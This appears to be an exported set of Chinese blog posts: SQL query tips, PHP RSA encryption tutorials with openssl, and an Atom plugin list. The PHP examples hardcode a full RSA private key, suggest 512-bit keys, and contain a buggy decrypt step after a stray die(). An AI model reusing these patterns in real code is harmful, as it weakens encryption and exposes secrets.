<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="meta">#Full wildcard</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">TABLE</span> <span class="keyword">WHERE</span> <span class="keyword">COLUMN</span> <span class="keyword">LIKE</span> <span class="string">&#x27;%hello%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#Postfix wildcard</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">TABLE</span> <span class="keyword">WHERE</span> <span class="keyword">COLUMN</span> <span class="keyword">LIKE</span> <span class="string">&#x27;hello%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#Prefix wildcard</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">TABLE</span> <span class="keyword">WHERE</span> <span class="keyword">COLUMN</span> <span class="keyword">LIKE</span> <span class="string">&#x27;%hello&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>来源: <span class="exturl" data-url="aHR0cDovL2h1bmdyZWQuY29tL3VzZWZ1bC1pbmZvcm1hdGlvbi93YXlzLW9wdGltaXplLXNxbC1xdWVyaWVzLw==">http://hungred.com/useful-information/ways-optimize-sql-queries/<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="采用-UNION-来代替-OR"><a href="#采用-UNION-来代替-OR" class="headerlink" title="采用 UNION 来代替 OR"></a>采用 UNION 来代替 OR</h2><p>下面的例子采用 OR 语句来：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">SELECT * FROM a, <span class="keyword">b </span>WHERE a.p = <span class="keyword">b.q </span><span class="keyword">or </span>a.x = <span class="keyword">b.y;</span></span><br></pre></td></tr></table></figure>

<p>UNION 语句，你可以将 2 个或更多 select 语句的结果拼在一起。下面的例子返回的结果同上面的一样，但是速度要快些：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> a, b <span class="keyword">WHERE</span> a.p = b.q</span><br><span class="line"></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> a, b <span class="keyword">WHERE</span> a.x = b.y</span><br></pre></td></tr></table></figure>

<p>来源: <span class="exturl" data-url="aHR0cDovL3d3dy5iY2FydGVyLmNvbS9vcHRpbXNxbC5odG0=">http://www.bcarter.com/optimsql.htm<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="使用索引"><a href="#使用索引" class="headerlink" title="使用索引"></a>使用索引</h2><p>数据库索引和你在图书馆中见到的索引类似：能让你更快速的获取想要的信息，正如图书馆中的索引能让读者更快的找到想要的书一样。</p>
<p>可以在一个列上创建索引，也可以在多个列上创建。索引是一种数据结构，它将表中的一列或多列的值以特定的顺序组织起来。</p>
<p>下面的语句在 Product 表的 Model 列上创建索引。这个索引的名字叫作 idxModel</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> idxModel <span class="keyword">ON</span> Product (Model);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
  </entry>
  <entry>
    <title>Php 生成加密公钥加密私钥</title>
    <url>/2017/04/php-encryption/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>生成公钥私钥     </p>
<p>win 下必须要 openssl.cof 支持，liunx 一般已自带安装  </p>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$config</span> = <span class="keyword">array</span>(  </span><br><span class="line">    <span class="comment">//&quot;digest_alg&quot; =&gt; &quot;sha512&quot;,  </span></span><br><span class="line">    <span class="string">&quot;private_key_bits&quot;</span> =&gt; <span class="number">512</span>,                     <span class="comment">//字节数    512 1024  2048   4096 等  </span></span><br><span class="line">    <span class="string">&quot;private_key_type&quot;</span> =&gt; OPENSSL_KEYTYPE_RSA,     <span class="comment">//加密类型  </span></span><br><span class="line">);  </span><br><span class="line">   </span><br><span class="line"><span class="comment">//1.创建公钥和私钥   返回资源  </span></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">openssl_pkey_new</span>(<span class="variable">$config</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//从得到的资源中获取私钥    并把私钥赋给$privKey</span></span><br><span class="line"><span class="title function_ invoke__">openssl_pkey_export</span>(<span class="variable">$res</span>, <span class="variable">$privKey</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//从得到的资源中获取私钥    并把私钥赋给$pubKey</span></span><br><span class="line"><span class="variable">$pubKey</span> = <span class="title function_ invoke__">openssl_pkey_get_details</span>(<span class="variable">$res</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$pubKey</span> = <span class="variable">$pubKey</span>[<span class="string">&quot;key&quot;</span>];  </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">array</span>(<span class="string">&#x27;privKey&#x27;</span>=&gt;<span class="variable">$privKey</span>,<span class="string">&#x27;pubKey&#x27;</span>=&gt;<span class="variable">$pubKey</span>));  </span><br><span class="line"><span class="keyword">die</span>;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//2.加密解密数据  要加密的数据  </span></span><br><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;plaintext data goes here&#x27;</span>;                         </span><br><span class="line"></span><br><span class="line"><span class="comment">//对$data进行加密 要加密的数据字符串  得到加密后的数据  加密所需要的公钥</span></span><br><span class="line"><span class="title function_ invoke__">openssl_public_encrypt</span>(<span class="variable">$data</span>, <span class="variable">$encrypted</span>, <span class="variable">$pubKey</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$encrypted</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//对加密后的数据进行解密  解密的数据  得到解密后的数据  解密所需要的私钥</span></span><br><span class="line"><span class="variable">$decrypted</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$encrypted</span>);</span><br><span class="line"><span class="title function_ invoke__">openssl_private_decrypt</span>(<span class="variable">$encrypted</span>, <span class="variable">$decrypted</span>, <span class="variable">$privKey</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decrypted</span>;   </span><br><span class="line"></span><br><span class="line"><span class="comment">//3.一个加密解密类  </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rsa</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>; <span class="comment">//公密钥  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>; <span class="comment">//私密钥  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$public_key_resource</span> = <span class="string">&#x27;&#x27;</span>; <span class="comment">//公密钥资源  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$private_key_resource</span> = <span class="string">&#x27;&#x27;</span>; <span class="comment">//私密钥资源  </span></span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * 架构函数 </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> [string] $public_key_file  [公密钥文件地址] </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> [string] $private_key_file [私密钥文件地址] </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$public_key</span>,<span class="variable">$private_key</span></span>) </span>&#123;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;public_key = <span class="variable">$public_key</span>;     </span><br><span class="line">		<span class="variable language_">$this</span>-&gt;private_key = <span class="variable">$private_key</span>;</span><br><span class="line"> </span><br><span class="line">		<span class="keyword">if</span>(<span class="literal">false</span> == (<span class="variable language_">$this</span>-&gt;public_key_resource = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">is_bad_public_key</span>(<span class="variable">$this</span>-&gt;public_key)) || <span class="literal">false</span> == (<span class="variable language_">$this</span>-&gt;private_key_resource = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">is_bad_private_key</span>(<span class="variable">$this</span>-&gt;private_key))) &#123;  </span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;public key or private key no usable&#x27;</span>);  </span><br><span class="line">		&#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">is_bad_public_key</span>(<span class="params"><span class="variable">$public_key</span></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_pkey_get_public</span>(<span class="variable">$public_key</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">is_bad_private_key</span>(<span class="params"><span class="variable">$private_key</span></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_pkey_get_private</span>(<span class="variable">$private_key</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * 生成一对公私密钥 成功返回 公私密钥数组 失败 返回 false </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">create_key</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="variable">$res</span> = <span class="title function_ invoke__">openssl_pkey_new</span>();  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span> == <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">        <span class="title function_ invoke__">openssl_pkey_export</span>(<span class="variable">$res</span>, <span class="variable">$private_key</span>);  </span><br><span class="line">        <span class="variable">$public_key</span> = <span class="title function_ invoke__">openssl_pkey_get_details</span>(<span class="variable">$res</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;public_key&#x27;</span>=&gt;<span class="variable">$public_key</span>[<span class="string">&quot;key&quot;</span>],<span class="string">&#x27;private_key&#x27;</span>=&gt;<span class="variable">$private_key</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * 用私密钥加密 </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">private_encrypt</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;  </span><br><span class="line">        <span class="title function_ invoke__">openssl_private_encrypt</span>(<span class="variable">$input</span>,<span class="variable">$output</span>,<span class="variable">$this</span>-&gt;private_key_resource);  </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$output</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * 解密 私密钥加密后的密文 </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">public_decrypt</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;  </span><br><span class="line">        <span class="title function_ invoke__">openssl_public_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$input</span>),<span class="variable">$output</span>,<span class="variable">$this</span>-&gt;public_key_resource);  </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * 用公密钥加密 </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">public_encrypt</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;  </span><br><span class="line">        <span class="title function_ invoke__">openssl_public_encrypt</span>(<span class="variable">$input</span>,<span class="variable">$output</span>,<span class="variable">$this</span>-&gt;public_key_resource);  </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$output</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * 解密 公密钥加密后的密文 </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">private_decrypt</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;  </span><br><span class="line">        <span class="title function_ invoke__">openssl_private_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$input</span>),<span class="variable">$output</span>,<span class="variable">$this</span>-&gt;private_key_resource);  </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$private_key</span> = <span class="string">&#x27;-----BEGIN RSA PRIVATE KEY-----  </span></span><br><span class="line"><span class="string">MIICXQIBAAKBgQC3//sR2tXw0wrC2DySx8vNGlqt3Y7ldU9+LBLI6e1KS5lfc5jl  </span></span><br><span class="line"><span class="string">TGF7KBTSkCHBM3ouEHWqp1ZJ85iJe59aF5gIB2klBd6h4wrbbHA2XE1sq21ykja/  </span></span><br><span class="line"><span class="string">Gqx7/IRia3zQfxGv/qEkyGOx+XALVoOlZqDwh76o2n1vP1D+tD3amHsK7QIDAQAB  </span></span><br><span class="line"><span class="string">AoGBAKH14bMitESqD4PYwODWmy7rrrvyFPEnJJTECLjvKB7IkrVxVDkp1XiJnGKH  </span></span><br><span class="line"><span class="string">2h5syHQ5qslPSGYJ1M/XkDnGINwaLVHVD3BoKKgKg1bZn7ao5pXT+herqxaVwWs6  </span></span><br><span class="line"><span class="string">ga63yVSIC8jcODxiuvxJnUMQRLaqoF6aUb/2VWc2T5MDmxLhAkEA3pwGpvXgLiWL  </span></span><br><span class="line"><span class="string">3h7QLYZLrLrbFRuRN4CYl4UYaAKokkAvZly04Glle8ycgOc2DzL4eiL4l/+x/gaq  </span></span><br><span class="line"><span class="string">deJU/cHLRQJBANOZY0mEoVkwhU4bScSdnfM6usQowYBEwHYYh/OTv1a3SqcCE1f+  </span></span><br><span class="line"><span class="string">qbAclCqeNiHajCcDmgYJ53LfIgyv0wCS54kCQAXaPkaHclRkQlAdqUV5IWYyJ25f  </span></span><br><span class="line"><span class="string">oiq+Y8SgCCs73qixrU1YpJy9yKA/meG9smsl4Oh9IOIGI+zUygh9YdSmEq0CQQC2  </span></span><br><span class="line"><span class="string">4G3IP2G3lNDRdZIm5NZ7PfnmyRabxk/UgVUWdk47IwTZHFkdhxKfC8QepUhBsAHL  </span></span><br><span class="line"><span class="string">QjifGXY4eJKUBm3FpDGJAkAFwUxYssiJjvrHwnHFbg0rFkvvY63OSmnRxiL4X6EY  </span></span><br><span class="line"><span class="string">yI9lblCsyfpl25l7l5zmJrAHn45zAiOoBrWqpM5edu7c  </span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$public_key</span> = <span class="string">&#x27;-----BEGIN PUBLIC KEY-----  </span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3//sR2tXw0wrC2DySx8vNGlqt  </span></span><br><span class="line"><span class="string">3Y7ldU9+LBLI6e1KS5lfc5jlTGF7KBTSkCHBM3ouEHWqp1ZJ85iJe59aF5gIB2kl  </span></span><br><span class="line"><span class="string">Bd6h4wrbbHA2XE1sq21ykja/Gqx7/IRia3zQfxGv/qEkyGOx+XALVoOlZqDwh76o  </span></span><br><span class="line"><span class="string">2n1vP1D+tD3amHsK7QIDAQAB  </span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rsa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">rsa</span>(<span class="variable">$public_key</span>,<span class="variable">$private_key</span>);   </span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;加密解密&#x27;</span>;  </span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$rsa</span>-&gt;<span class="title function_ invoke__">public_encrypt</span>(<span class="variable">$str</span>); <span class="comment">//用公密钥加密  </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>,<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;  </span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$rsa</span>-&gt;<span class="title function_ invoke__">private_decrypt</span>(<span class="variable">$str</span>); <span class="comment">//用私密钥解密  </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>,<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;  </span><br><span class="line"><span class="comment">//=============================================================  </span></span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$rsa</span>-&gt;<span class="title function_ invoke__">private_encrypt</span>(<span class="variable">$str</span>); <span class="comment">//用私密钥加密  </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>,<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;  </span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$rsa</span>-&gt;<span class="title function_ invoke__">public_decrypt</span>(<span class="variable">$str</span>); <span class="comment">//用公密钥解密  </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>,<span class="string">&#x27;&lt;/br&gt;&#x27;</span>; </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>Php RSA 加密解密实例</title>
    <url>/2017/04/php-rsa/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>PHP 服务端与客户端交互、提供开放 api 时，通常需要对敏感的部分 api 数据传输进行数据加密，这时候 rsa 非对称加密就能派上用处了。</p>
<p>下面通过一个例子来说明如何用 php 来实现数据的加密解密</p>
<span id="more"></span> 

<h2 id="1-加密解密的第一步是生成公钥、私钥对，私钥加密的内容能通过公钥解密（反过来亦可以）"><a href="#1-加密解密的第一步是生成公钥、私钥对，私钥加密的内容能通过公钥解密（反过来亦可以）" class="headerlink" title="1. 加密解密的第一步是生成公钥、私钥对，私钥加密的内容能通过公钥解密（反过来亦可以）"></a>1. 加密解密的第一步是生成公钥、私钥对，私钥加密的内容能通过公钥解密（反过来亦可以）</h2><p>下载开源 RSA 密钥生成工具 openssl（通常 Linux 系统都自带该程序），解压缩至独立的文件夹，进入其中的 bin 目录，执行以下命令：</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>openssl genrsa -<span class="keyword">out</span> rsa_private_key.pem <span class="number">1024</span></span><br><span class="line"><span class="variable">$ </span>openssl pkcs8 -topk8 -inform PEM -in rsa_private_key.pem -outform PEM -nocrypt -<span class="keyword">out</span> private_key.pem</span><br><span class="line"><span class="variable">$ </span>openssl rsa -in rsa_private_key.pem -pubout -<span class="keyword">out</span> rsa_public_key.pem</span><br></pre></td></tr></table></figure>
<p>第一条命令生成原始 RSA 私钥文件 rsa_private_key.pem，第二条命令将原始 RSA 私钥转换为 pkcs8 格式，第三条生成 RSA 公钥 rsa_public_key.pem</p>
<p>从上面看出通过私钥能生成对应的公钥，因此我们将私钥 private_key.pem 用在服务器端，公钥发放给 Android 跟 iOS 等前端</p>
<h2 id="2-php-中用生成的公钥、私钥进行加密解密，直接上代码"><a href="#2-php-中用生成的公钥、私钥进行加密解密，直接上代码" class="headerlink" title="2. php 中用生成的公钥、私钥进行加密解密，直接上代码"></a>2. php 中用生成的公钥、私钥进行加密解密，直接上代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$private_key</span> = <span class="string">&#x27;-----BEGIN RSA PRIVATE KEY-----  </span></span><br><span class="line"><span class="string">MIICXQIBAAKBgQC3//sR2tXw0wrC2DySx8vNGlqt3Y7ldU9+LBLI6e1KS5lfc5jl  </span></span><br><span class="line"><span class="string">TGF7KBTSkCHBM3ouEHWqp1ZJ85iJe59aF5gIB2klBd6h4wrbbHA2XE1sq21ykja/  </span></span><br><span class="line"><span class="string">Gqx7/IRia3zQfxGv/qEkyGOx+XALVoOlZqDwh76o2n1vP1D+tD3amHsK7QIDAQAB  </span></span><br><span class="line"><span class="string">AoGBAKH14bMitESqD4PYwODWmy7rrrvyFPEnJJTECLjvKB7IkrVxVDkp1XiJnGKH  </span></span><br><span class="line"><span class="string">2h5syHQ5qslPSGYJ1M/XkDnGINwaLVHVD3BoKKgKg1bZn7ao5pXT+herqxaVwWs6  </span></span><br><span class="line"><span class="string">ga63yVSIC8jcODxiuvxJnUMQRLaqoF6aUb/2VWc2T5MDmxLhAkEA3pwGpvXgLiWL  </span></span><br><span class="line"><span class="string">3h7QLYZLrLrbFRuRN4CYl4UYaAKokkAvZly04Glle8ycgOc2DzL4eiL4l/+x/gaq  </span></span><br><span class="line"><span class="string">deJU/cHLRQJBANOZY0mEoVkwhU4bScSdnfM6usQowYBEwHYYh/OTv1a3SqcCE1f+  </span></span><br><span class="line"><span class="string">qbAclCqeNiHajCcDmgYJ53LfIgyv0wCS54kCQAXaPkaHclRkQlAdqUV5IWYyJ25f  </span></span><br><span class="line"><span class="string">oiq+Y8SgCCs73qixrU1YpJy9yKA/meG9smsl4Oh9IOIGI+zUygh9YdSmEq0CQQC2  </span></span><br><span class="line"><span class="string">4G3IP2G3lNDRdZIm5NZ7PfnmyRabxk/UgVUWdk47IwTZHFkdhxKfC8QepUhBsAHL  </span></span><br><span class="line"><span class="string">QjifGXY4eJKUBm3FpDGJAkAFwUxYssiJjvrHwnHFbg0rFkvvY63OSmnRxiL4X6EY  </span></span><br><span class="line"><span class="string">yI9lblCsyfpl25l7l5zmJrAHn45zAiOoBrWqpM5edu7c  </span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$public_key</span> = <span class="string">&#x27;-----BEGIN PUBLIC KEY-----  </span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3//sR2tXw0wrC2DySx8vNGlqt  </span></span><br><span class="line"><span class="string">3Y7ldU9+LBLI6e1KS5lfc5jlTGF7KBTSkCHBM3ouEHWqp1ZJ85iJe59aF5gIB2kl  </span></span><br><span class="line"><span class="string">Bd6h4wrbbHA2XE1sq21ykja/Gqx7/IRia3zQfxGv/qEkyGOx+XALVoOlZqDwh76o  </span></span><br><span class="line"><span class="string">2n1vP1D+tD3amHsK7QIDAQAB  </span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//echo $private_key;  </span></span><br><span class="line"><span class="variable">$pi_key</span> =  <span class="title function_ invoke__">openssl_pkey_get_private</span>(<span class="variable">$private_key</span>);<span class="comment">//这个函数可用来判断私钥是否是可用的，可用返回资源id Resource id  </span></span><br><span class="line"><span class="variable">$pu_key</span> = <span class="title function_ invoke__">openssl_pkey_get_public</span>(<span class="variable">$public_key</span>);<span class="comment">//这个函数可用来判断公钥是否是可用的  </span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$pi_key</span>);<span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;  </span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$pu_key</span>);<span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;aassssasssddd&quot;</span>;<span class="comment">//原始数据  </span></span><br><span class="line"><span class="variable">$encrypted</span> = <span class="string">&quot;&quot;</span>;   </span><br><span class="line"><span class="variable">$decrypted</span> = <span class="string">&quot;&quot;</span>;   </span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;source data:&quot;</span>,<span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private key encrypt:\n&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">openssl_private_encrypt</span>(<span class="variable">$data</span>,<span class="variable">$encrypted</span>,<span class="variable">$pi_key</span>);<span class="comment">//私钥加密  </span></span><br><span class="line"><span class="variable">$encrypted</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$encrypted</span>);<span class="comment">//加密后的内容通常含有特殊字符，需要编码转换下，在网络间通过url传输时要注意base64编码是否是url安全的  </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$encrypted</span>,<span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public key decrypt:\n&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">openssl_public_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$encrypted</span>),<span class="variable">$decrypted</span>,<span class="variable">$pu_key</span>);<span class="comment">//私钥加密的内容通过公钥可用解密出来  </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decrypted</span>,<span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;---------------------------------------\n&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public key encrypt:\n&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">openssl_public_encrypt</span>(<span class="variable">$data</span>,<span class="variable">$encrypted</span>,<span class="variable">$pu_key</span>);<span class="comment">//公钥加密  </span></span><br><span class="line"><span class="variable">$encrypted</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$encrypted</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$encrypted</span>,<span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private key decrypt:\n&quot;</span>;  </span><br><span class="line"><span class="title function_ invoke__">openssl_private_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$encrypted</span>),<span class="variable">$decrypted</span>,<span class="variable">$pi_key</span>);<span class="comment">//私钥解密  </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decrypted</span>,<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>我的 Atom 开发工具</title>
    <url>/2018/11/devtools-atom/</url>
    <content><![CDATA[<h4 id="不知不觉折腾-Atom-已经两个星期了，主要被他漂亮简介的主题所吸引，还有会震动的效果。"><a href="#不知不觉折腾-Atom-已经两个星期了，主要被他漂亮简介的主题所吸引，还有会震动的效果。" class="headerlink" title="不知不觉折腾 Atom 已经两个星期了，主要被他漂亮简介的主题所吸引，还有会震动的效果。"></a>不知不觉折腾 Atom 已经两个星期了，主要被他漂亮简介的主题所吸引，还有会震动的效果。</h4><h4 id="下面我详细介绍下我的-Atom-插件配置和说明"><a href="#下面我详细介绍下我的-Atom-插件配置和说明" class="headerlink" title="下面我详细介绍下我的 Atom 插件配置和说明"></a>下面我详细介绍下我的 Atom 插件配置和说明</h4><span id="more"></span>

<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">Community Packages (<span class="number">19</span>) C:\Users\Slagga\.atom\packages</span><br><span class="line">├── activate-power-mode@2<span class="number">.0</span><span class="number">.0</span></span><br><span class="line">├── atom-autocomplete-php@0<span class="number">.25</span><span class="number">.6</span></span><br><span class="line">├── atom-beautify@0<span class="number">.29</span><span class="number">.26</span></span><br><span class="line">├── atom-<span class="keyword">file</span>-types@0<span class="number">.5</span><span class="number">.5</span></span><br><span class="line">├── atom-goto-definition@1<span class="number">.3</span><span class="number">.3</span></span><br><span class="line">├── atom-php-cs-fixer@4<span class="number">.1</span><span class="number">.0</span></span><br><span class="line">├── atom-quick-highlight@0<span class="number">.10</span><span class="number">.0</span></span><br><span class="line">├── autocomplete-paths@1<span class="number">.0</span><span class="number">.5</span></span><br><span class="line">├── busy-signal@1<span class="number">.4</span><span class="number">.3</span></span><br><span class="line">├── emmet-atom@2<span class="number">.4</span><span class="number">.3</span></span><br><span class="line">├── <span class="keyword">file</span>-type-icons@1<span class="number">.3</span><span class="number">.4</span></span><br><span class="line">├── goto@1<span class="number">.8</span><span class="number">.3</span></span><br><span class="line">├── intentions@1<span class="number">.1</span><span class="number">.2</span></span><br><span class="line">├── linter@2<span class="number">.1</span><span class="number">.4</span></span><br><span class="line">├── linter-php@1<span class="number">.3</span><span class="number">.2</span></span><br><span class="line">├── minimap@4<span class="number">.28</span><span class="number">.2</span></span><br><span class="line">├── minimap-find-and-replace@4<span class="number">.5</span><span class="number">.2</span></span><br><span class="line">└── php-class-tree@1<span class="number">.0</span><span class="number">.0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

